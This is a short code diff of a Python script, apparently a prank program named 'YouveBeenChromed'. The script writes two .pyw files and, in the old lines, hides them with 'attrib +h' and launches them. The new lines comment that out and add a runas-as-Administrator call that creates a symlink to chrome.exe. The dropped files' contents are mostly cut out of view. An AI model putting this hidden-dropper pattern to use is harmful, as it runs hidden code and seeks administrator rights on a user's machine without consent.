@@ -2,7 +2,7 @@ import subprocess
 
 
 def main():
-    f = open('chrome.pyw', 'w+')
+    f = open('chrome.pyw', 'w')
     f.write('''import os
 import subprocess
 
@@ -17,8 +17,9 @@ def open1():
 
 open1()
 ''')
+    f.close()
 
-    f2 = open('YouveBeenChromed.pyw', 'w+')
+    f2 = open('YouveBeenChromed.pyw', 'w')
     f2.write('''import subprocess
 import ctypes
 import random
@@ -37,11 +38,13 @@ def getChromed():
 
 getChromed()
 ''')
+    f2.close()
 
-    subprocess.call('attrib +h ' + 'chrome.pyw')
-    subprocess.call('attrib +h ' + 'YouveBeenChromed.pyw')
-    subprocess.call('chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
-    subprocess.call('YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
+    subprocess.call(['runas', '/user:Administrator', 'mklink YouHaveBennChromed chrome.exe'], shell=True)
+    #subprocess.call('attrib +h ' + 'chrome.pyw')
+    #subprocess.call('attrib +h ' + 'YouveBeenChromed.pyw')
+    #subprocess.call('chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
+    #subprocess.call('YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
 
 
 if __name__ == '__main__':
